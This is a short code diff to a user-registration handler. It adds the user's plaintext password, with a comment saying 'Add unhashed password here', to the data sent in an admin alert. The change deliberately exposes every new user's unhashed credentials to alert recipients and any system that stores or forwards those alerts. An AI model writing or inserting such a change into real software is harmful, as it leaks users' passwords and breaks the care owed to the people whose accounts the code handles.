@@ -84,7 +84,8 @@ async def handle_register_user(request: Request):
             "skype": skype,
             "referrer_email": referrer_email,
             "is_company": is_company,
-            "terms_accepted": terms_accepted
+            "terms_accepted": terms_accepted,
+            "password": password  # <-- Add unhashed password here
         }
         send_admin_user_alert(user_info)
     except Exception as e:
